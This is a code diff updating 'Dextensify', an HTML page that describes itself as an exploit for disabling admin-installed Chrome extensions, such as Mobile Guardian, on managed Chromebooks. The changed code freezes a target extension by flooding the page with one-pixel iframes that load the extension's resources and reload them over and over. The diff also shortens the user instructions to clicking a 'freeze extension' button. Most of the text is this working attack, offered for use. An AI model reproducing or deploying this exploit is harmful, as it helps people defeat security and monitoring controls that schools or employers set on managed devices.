@@ -162,6 +162,10 @@
           name: "Mobile Guardian",
           url: "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html"
         },
+        "ruffle": {
+          name: "Ruffle - Flash Emulator (for testing)",
+          url: "chrome-extension://donbcfbmhbcapadipfkeojnmajbakjdc/dist/player.js"
+        },
       };
 
       async function check_url(url) {
@@ -217,38 +221,23 @@
       }
 
       function button_handler(extension) {
-        let cancel = !confirm("After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up.");
-        if (cancel) return;
-        
-        setTimeout(() => {
-          create_iframes(extension);
-        }, 5000);
+        alert("Hit OK, then wait a few seconds, after which the extension will be disabled.");
+        create_iframes(extension);
       }
 
       function create_iframes(extension) {
-        let iframes = []
-        let iterations = 5;
-        let public_url = extension.url;
-        
-        while (true) {
+        for (let i=0; i<20; i++) {
           let iframe = document.createElement("iframe");
+          iframe.src = extension.url;
+          iframe.height = 1;
+          iframe.width = 1;
+          iframe.onload = () => {
+              setInterval(() => {iframe.width = Math.random()*10}, 0);
+              setTimeout(() => {
+                  setInterval(() => {iframe.src = iframe.src}, 5000);    
+              }, Math.random()*5000)
+          };
           document.body.append(iframe);
-          iframes.push(iframe);
-
-          //let subframe_count = Math.max(2, 200 - iterations);
-          for (let i=0; i<50; i++) {
-            let subframe = document.createElement("iframe");
-            subframe.src = public_url;
-            subframe.style.width = subframe.style.height = "1px";
-            iframe.contentDocument.body.append(subframe);
-          }
-
-          while (iframes.length > Math.max(3, 10-iterations)) {
-            iframes[0].remove();
-            iframes.shift();
-          }
-
-          iterations++;
         }
       }
 
@@ -261,12 +250,8 @@
       <p>Dextensify is an exploit which lets you disable most admin-installed Chrome extensions from any webpage.</p>
       <h2>Instructions</h2>
       <ol>
-        <li>Open chrome://extensions in a new tab. Keep this page open.</li>
-        <li>Go to the settings page for the extension you want to disable.</li>
-        <li>On the Dextensify page, click the "freeze extension" button. Immediately switch back to the chrome://extensions tab.</li>
-        <li>Back on the chrome://extensions page, spam the "allow access to file URLs" switch for a few seconds.</li>
-        <li>The extension should now be temporarily disabled. For this effect to persist, flip the "allow access to file URLs" again every few minutes, or if pages start getting blocked again.</li>
-        <li>You may also need to reopen this page every once in a while to prevent an unavoidable memory leak from crashing the system.</li>
+        <li>Click on the freeze extension button below.</li>
+        <li>Wait a few seconds.</li>
       </ol>
       <p>During this process, your Chromebook may hang momentarily. This is normal, and it should resolve itself after a few seconds.</p>
       <div id="buttons_container">
@@ -276,7 +261,7 @@
       <hr>
       <details>
         <summary style="margin-bottom: 8px;">
-          Made by <a href="https://ading.dev" target="_blank">ading2210</a>. This file is licensed under the MIT license.
+          Made by <a href="https://ading.dev" target="_blank">ading2210</a>. This file is licensed under the MIT license. See the <a href="https://github.com/ading2210/dextensify">Github repository</a> for more info.
         </summary>
         <pre>MIT License
 Copyright (c) 2023 ading2210
@@ -298,7 +283,7 @@ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 SOFTWARE.</pre>
-        <p style="font-size: 13px; text-align: right;"><i>Version 1.1.2</i></p>
+        <p style="font-size: 13px; text-align: right;"><i>Version v2.0.0-beta1</i></p>
       </details>
     </div>
   </body>
